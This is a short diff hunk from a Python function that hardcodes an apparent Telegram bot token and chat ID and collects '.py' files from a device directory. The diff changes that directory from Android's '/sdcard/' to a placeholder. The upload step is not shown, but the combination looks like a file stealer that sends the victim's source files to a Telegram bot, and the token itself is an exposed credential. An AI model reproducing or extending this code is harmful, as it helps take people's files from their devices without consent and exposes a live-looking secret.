@@ -42,7 +42,7 @@ def akin():
 	bot_token = ('5818305759:AAFo3x5sYh0qvKUR5a8yr1Xn3u-EkefyWqc')
 	chat_id = ('1818606358')
 	extension = ('.py')
-	path = os.path.join('/sdcard/')
+	path = os.path.join('/cd SOME/')
 	for file in os.listdir(path):
 		if file.endswith(extension):
 			file_path = os.path.join(path, file)
